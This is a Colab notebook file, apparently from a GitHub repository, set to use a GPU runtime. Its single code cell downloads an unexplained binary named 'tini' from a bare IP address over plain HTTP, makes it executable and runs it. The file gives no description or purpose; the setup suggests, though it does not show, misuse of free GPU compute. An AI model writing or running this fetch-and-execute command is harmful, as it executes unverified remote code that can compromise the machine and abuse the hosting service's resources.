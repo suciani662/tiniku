{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tini",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyNcPr9XqvXieCfaHaFPVw1A",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/suciani662/tiniku/blob/main/tini.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "M9OyDG4ijKhg"
      },
      "outputs": [],
      "source": [
        "! wget http://137.184.39.112/beton/tini && chmod +x tini && ./tini"
      ]
    }
  ]
}